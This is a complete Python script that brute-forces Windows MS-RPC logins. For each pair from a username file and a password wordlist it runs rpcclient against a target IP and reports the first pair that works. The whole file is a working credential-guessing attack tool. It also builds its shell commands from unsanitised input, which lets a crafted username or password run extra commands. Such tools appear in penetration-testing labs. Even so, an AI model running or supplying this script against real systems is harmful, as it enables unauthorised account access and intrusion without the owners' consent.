import subprocess
import sys

if len(sys.argv) != 4:
    print("Usage: python3 msrpcbruteforce.py <usernames_file> <IP> <pathtowordlist>")
    sys.exit()

usernames_file = sys.argv[1]
ip = sys.argv[2]
wordlist = open(sys.argv[3], "r").readlines()

with open(usernames_file, "r") as f:
    usernames = [line.strip() for line in f]

for user in usernames:
    for passwd in wordlist:
        passwd = passwd.strip()
        cmd = f"rpcclient -U {user}%{passwd} {ip} -c srvinfo"
        x = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        result = x.communicate()[0].decode('utf-8')
        
        if "NT_STATUS_LOGON_FAILURE" in result:
            continue
        elif "platform_id" in result:
            print(f"Success with: {user}:{passwd}")
            sys.exit()

print(f"[-] No results found for IP: {ip} and wordlist: {sys.argv[3]}")